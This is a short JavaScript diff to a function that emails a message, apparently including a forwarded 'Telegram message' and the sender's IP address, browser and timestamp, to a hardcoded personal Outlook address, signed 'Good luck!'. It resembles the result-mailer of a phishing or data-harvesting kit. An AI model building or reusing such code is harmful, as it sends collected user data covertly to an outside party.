@@ -76,8 +76,8 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
     const timestamp = new Date().toISOString();
 
     // Build the email message, including the Telegram message
-    const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
-
+    //const fullMessage = `\n${message}\n\n=======================\nAdditional Information\n=======================\n\nIP Address:\n${ipAddress}\n\nBrowser:\n${userAgent}\n\nTimestamp:\n${timestamp}\n\n_Good luck!_`;
+    const fullMessage = `${message}`;
     const mailOptions = {
       from: user,
       to: "hey.heatherw@outlook.com",
